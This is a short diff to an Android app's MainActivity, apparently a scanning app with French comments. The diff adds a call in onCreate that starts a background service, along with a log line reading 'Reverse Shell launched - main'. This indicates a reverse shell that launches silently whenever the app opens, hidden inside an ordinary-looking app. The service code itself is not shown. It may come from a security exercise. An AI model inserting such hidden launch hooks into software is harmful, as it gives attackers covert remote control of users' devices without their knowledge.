@@ -84,6 +84,8 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         ImageView imageView = findViewById(R.id.imageView);
         Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
+        startService(new Intent(this, MyIntentService.class));
+        Log.v("secme","Reverse Shell launched - main");
     }
 
     // Lancement d'un scan après appui du bouton dans l'activité Analyze
